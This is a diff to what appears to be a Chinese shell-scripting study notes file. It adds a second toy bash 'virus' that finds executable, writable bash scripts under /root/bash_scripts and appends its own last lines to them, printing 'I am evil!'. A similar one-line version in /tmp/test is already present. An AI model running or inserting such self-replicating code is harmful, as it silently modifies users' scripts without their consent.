@@ -949,6 +949,20 @@ esac
 ```shell
 #!/bin/bash
 if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &> /dev/null && continue ; file $i | grep "Bourne-Again shell script" &> /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 >> $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &> /dev/null ; fi
+
+
+#!/bin/bash
+[ -e /tmp/.AmIbug ] && exit
+touch /tmp/.AmIbug
+for files in `find /root/bash_scripts/*`
+do
+        grep "AmIbug" $files &> /dev/null && continue
+        file $files|grep "Bourne-Again shell script" &> /dev/null ||continue
+        [ -x $files -a -w $files ] || continue
+        tail -n 11 $0 >> $files
+done
+echo "I am evil!"
+rm -f /tmp/.AmIbug
 ```
 ---
 如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定
